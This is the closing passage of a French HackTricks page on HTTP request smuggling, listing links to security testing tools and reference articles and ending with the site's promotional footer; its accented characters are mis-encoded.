[Image provenant d'ici.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP basÃ© sur une grammaire utile pour trouver des divergences Ã©tranges dans les requÃªtes de smuggling.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
